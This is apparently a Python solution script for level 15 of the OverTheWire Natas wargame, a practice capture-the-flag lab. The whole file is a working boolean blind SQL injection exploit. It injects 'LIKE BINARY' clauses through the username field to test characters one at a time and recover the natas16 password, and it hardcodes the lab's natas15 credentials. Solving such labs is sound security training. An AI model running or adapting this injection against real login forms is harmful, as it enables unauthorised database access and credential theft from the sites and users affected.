import requests

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
filtered_chars = ""
final_pass = ""

print("Filtering chars...")
for c in chars:
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php', auth=(username, password), data={"username": 'natas16" and password LIKE BINARY "%'+c+'%" #'})
    if ("exists" in r.text):
        filtered_chars += c

print("filtered_chars: "+filtered_chars)

for i in range(32):
    for x in filtered_chars:
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php', auth=(username, password), data={"username": 'natas16" and password LIKE BINARY "'+final_pass+x+'%" #'})
        if ("exists" in r.text):
            final_pass = final_pass + x
            print(final_pass)
            break

print("final_pass: "+final_pass)